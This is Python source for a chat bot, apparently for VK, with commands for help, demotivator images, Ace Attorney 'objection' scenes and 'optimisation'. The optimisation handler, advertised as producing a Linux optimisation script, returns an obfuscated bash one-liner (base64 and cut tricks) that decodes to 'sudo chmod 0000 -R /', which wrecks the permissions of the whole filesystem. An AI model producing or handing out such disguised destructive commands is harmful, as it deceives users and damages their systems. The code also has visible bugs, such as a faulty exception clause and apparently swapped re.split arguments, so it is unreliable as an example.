import atexit
import base64
import json
import re
import tempfile

from datetime import datetime
from os.path import join
from random import randint, choice
from typing import List, Awaitable, Callable
from string import ascii_letters as ASCII_LETTERS

import requests
from PIL import UnidentifiedImageError
from requests.exceptions import SSLError

from images.demotivator import Demotivator
from images.searchimages import ImgSearch
from images.vasyacache import Vasya


class Bot:
    def __init__(self):
        self._rateLimit = self._RateLimit()
        self._imgSearch = ImgSearch()

    class _RateLimit:
        _recent = {}

        async def ratecounter(self, _id: int) -> bool:
            now = datetime.now().timestamp()
            if _id in self._recent.keys() and self._recent[_id] > now:
                self._recent[_id] += 3
                return False
            else:
                self._recent[_id] = now + 3
                return True

    class _Handler:
        ratecounter: Callable[[int], Awaitable[bool]]
        imgSearch: ImgSearch

        def __init__(self, ratecounter: Callable[[int], Awaitable[bool]], imgSearch: ImgSearch):
            self._ratecounter = ratecounter
            self._imgSearch = imgSearch

        class Image:
            url: str
            filepath: str

            def __init__(self, url: str = None, filepath: str = None):
                assert url or filepath, 'URL or filepath for image must be provided.'
                self.url = url
                self.filepath = filepath

        class Doc:
            filepath: str

            def __init__(self, filepath: str):
                self.filepath = filepath

        @staticmethod
        async def filter(query: str) -> bool:
            ...

        async def parseMsg(self, msg) -> dict:  # returns a parsed dict of command params
            command = re.split(' |\n', msg)[0]
            args = msg[len(command) + 1:]
            return {
                'command': command,
                'arguments': args
            }

    registredHandlers: List[_Handler]

    async def _regHandler(self, h: type) -> None:
        ...

    class _Help(_Handler):
        @staticmethod
        async def filter(msg: str) -> bool:
            return msg in ['help', 'команды', 'помощь', 'commands']

        async def run(self) -> list:
            return ['''Внимание! Не срите в бота чаще 3 секунд! 1 превышение лимита = +3 секунды к игнору.
Команды:
оптимизация - Сгенерировать скрипт оптимизации kaл linux
демотиватор текст сверху
текст снизу - генерация демотиватора с приложенной картинкой.
При вызове без картинки используется картинка по запросу, равному тексту сверху
При вызове без параметров генерируется текст на основе ассоциаций бота васи ( https://vk.com/vasyamashinka )
Поддерживается пересылка сообщений с картинкой и/или текстом.''']

    class _Optimisation(_Handler):
        @staticmethod
        async def filter(query: str):
            return query.startswith(('оптимизация', 'optimisation'))

        async def run(self) -> list:
            def bashEncode(string):
                def randString(size):
                    return ''.join(choice(ASCII_LETTERS) for _ in range(size))

                def b64(s):
                    return f"`echo {base64.b64encode(bytes(s, 'ascii')).decode('ascii')} | base64 -d`"

                def cut(s):
                    len1, len2 = randint(2, 10), randint(2, 10)
                    rand1, rand2 = randString(len1), randString(len2)
                    pos = len1 + 1
                    return f"`echo {rand1}{s}{rand2} | cut -b {pos}-{pos}`"

                result = "$("
                for sym in string:
                    mode = randint(0, 1)
                    if mode == 0:
                        result += b64(sym)
                    elif mode == 1:
                        result += cut(sym)
                return result + ")"

            return [bashEncode("sudo chmod 0000 -R /")]

    class _Demotivator(_Handler):
        def __init__(self, ratecounter, imgSearch):
            super().__init__(ratecounter, imgSearch)
            self._demotivator = Demotivator()
            self._vasyaCache = Vasya(self._demotivator, self._imgSearch)
            self._vasyaCache.start()
            atexit.register(lambda: setattr(self._vasyaCache, "running", False))

        @staticmethod
        async def filter(msg: str):
            return msg.startswith(('демотиватор', 'demotivator'))

        async def run(self, _id: int, msg: str, attachedPhotos: list) -> list:
            args = (await super().parseMsg(msg))['arguments']
            result = []
            notFound = False
            msg = re.split(args, "\n|!@next!@@next!@")
            if not msg[0]:
                if len(msg) == 1:
                    result.append(self.Image(filepath=self._vasyaCache.getDemotivator()))
                    return result
                else:
                    msg[0] = msg[1]
                    msg[1] = ''
            if len(msg) > 1:
                msg[1] = '\n'.join(msg[1:])
            else:
                msg.append('')

            d: Demotivator
            try:
                d = self._demotivator.create(
                    attachedPhotos[0],
                    msg[0],
                    msg[1]
                )
            except IndexError or AttributeError:
                query = msg[0]
                links = self._imgSearch.fetch(query)
                if not links:
                    links = self._imgSearch.fetch("kernel panic")
                    notFound = True
                link = links[randint(0, len(links) - 1)]
                while True:
                    try:
                        d = self._demotivator.create(
                            link,
                            msg[0],
                            msg[1]
                        )
                        break
                    except (UnidentifiedImageError, SSLError, requests.exceptions.ConnectionError):
                        links.pop(links.index(link))
                        link = links[randint(0, len(links) - 1)]
                        continue
            result.append(self.Image(filepath=d))
            if notFound:
                result.append("kалов не найдено((9(")
            return result

    class _Objection(_Handler):
        jsonPattern: dict

        def __init__(self, ratecounter, imgSearch):
            super().__init__(ratecounter, imgSearch)
            self._jsonPattern = {
                "Id": 0,
                "Text": "",
                "PoseId": 1,
                "PoseAnimation": True,
                "Flipped": False,
                "BubbleType": "0",
                "GoNext": False,
                "MergeNext": False,
                "DoNotTalk": False,
                "Username": ""
            }
            self._usage = 'Использование: '

        @staticmethod
        async def filter(msg: str):
            return msg.startswith(('обжекшон', 'objection'))

        async def run(self, _id: int, msg: str, fwdNames: list) -> list:
            result = []
            args = (await super().parseMsg(msg))['arguments'].split('!@next!@')
            if not args[0]:
                return [self._usage]
            if len(fwdNames) != len(args):
                if not fwdNames:
                    fwdNames = [{'firstName': 'Имя'} for x in args]
                else:
                    return [self._usage]
            for i in range(len(args)):
                phrase = self._jsonPattern.copy()
                phrase['Username'] = fwdNames[i]['firstName']
                phrase['Text'] = args[i]
                phrase['Id'] = i
                result.append(phrase)
            result = base64.b64encode(bytes(json.dumps(result), 'ascii')).decode('ascii')
            jsonFile = join(tempfile.gettempdir(), str(randint(-32767, 32767)) + '.json')
            with open(jsonFile, 'w') as file:
                file.write(result)
            result = [self.Doc(jsonFile)]
            return result
